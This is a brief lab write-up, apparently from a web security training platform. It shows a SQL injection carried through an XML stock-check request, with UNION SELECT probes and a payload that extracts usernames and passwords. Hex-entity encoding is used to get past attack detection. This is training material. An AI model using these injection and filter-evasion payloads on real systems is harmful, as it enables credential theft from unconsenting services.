# XML encoding

> for example a POST /product/stock request could send an xml to the database where it content can be manipulated

```
POST /product/stock HTTP/2
Host: 0aa5009c04964b8785f02bcf00cb007a.web-security-academy.net
Cookie: session=GJOUKBWYDdRwANKjucXQkToFjAccXXBs
Content-Length: 107
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0aa5009c04964b8785f02bcf00cb007a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa5009c04964b8785f02bcf00cb007a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```

> testing for query

`<storeId>1+1</storeId>`

`<storeId>1 UNION SELECT NULL</storeId>`

> lets try to get some credentials

```
<storeId>
    <@hex_entities>
        1 UNION SELECT username || '~' || password FROM users
    </@hex_entities>
</storeId>
```

> the `<@hex_entities>` used to go around the attack detection
